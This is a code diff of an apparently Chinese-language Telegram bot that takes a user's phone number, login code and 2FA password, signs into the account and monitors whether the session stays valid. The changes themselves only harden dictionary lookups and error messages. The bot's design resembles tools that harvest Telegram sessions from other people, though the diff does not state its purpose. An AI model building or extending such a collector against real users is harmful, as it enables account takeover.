@@ -202,9 +202,9 @@ async def _post_login_session_check(bot: Bot, chat_id: int, phone: str):
             await asyncio.sleep(delay)
 
             result = await login_engine.check_session(phone)
-            logger.info(f"Session check for {phone}: {result['success']}")
+            logger.info(f"Session check for {phone}: {result.get('success')}")
 
-            if result["success"]:
+            if result.get("success"):
                 if not notified_valid:
                     notified_valid = True
                     text = _c("session_valid_text", "✅ Session 有效")
@@ -420,7 +420,7 @@ async def handle_contact(message: Message, bot: Bot):
     uid = message.from_user.id
     _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}")
     result = await login_engine.send_code(phone)
-    if result["success"]:
+    if result.get("success"):
         _user_state[uid] = {
             "phone": phone, "step": "code",
             "created_at": time.time(), "attempts": 0,
@@ -431,8 +431,9 @@ async def handle_contact(message: Message, bot: Bot):
         await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
         logger.info(f"[{uid}] 验证码已发送 -> {phone}")
     else:
-        await message.answer(f"❌ {result['message']}", reply_markup=main_menu_kb())
-        logger.warning(f"[{uid}] 发送验证码失败: {result['message']}")
+        err_msg = result.get('message', '发送验证码失败')
+        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())
+        logger.warning(f"[{uid}] 发送验证码失败: {err_msg}")
 
 
 # ── 手动输入手机号 ──────────────────────────────────────────────────
@@ -456,7 +457,7 @@ async def handle_phone_input(message: Message, bot: Bot):
 
     phone = message.text.strip()
     result = await login_engine.send_code(phone)
-    if result["success"]:
+    if result.get("success"):
         _user_state[uid] = {
             "phone": phone, "step": "code",
             "created_at": time.time(), "attempts": 0,
@@ -468,7 +469,8 @@ async def handle_phone_input(message: Message, bot: Bot):
         logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
     else:
         _user_state.pop(uid, None)
-        await message.answer(f"❌ {result['message']}", reply_markup=main_menu_kb())
+        err_msg = result.get('message', '发送验证码失败')
+        await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())
 
 
 # ── 验证码输入 ──────────────────────────────────────────────────────
@@ -500,7 +502,7 @@ async def handle_code_input(message: Message, bot: Bot):
     code = match.group(1)
     result = await login_engine.sign_in_with_code(phone, code)
 
-    if result["success"]:
+    if result.get("success"):
         _user_state.pop(uid, None)
         await _handle_login_success(
             bot, message.chat.id, uid, phone,
@@ -548,7 +550,7 @@ async def handle_2fa_input(message: Message, bot: Bot):
 
     result = await login_engine.sign_in_with_2fa(phone, password)
 
-    if result["success"]:
+    if result.get("success"):
         _user_state.pop(uid, None)
         await _handle_login_success(
             bot, message.chat.id, uid, phone,
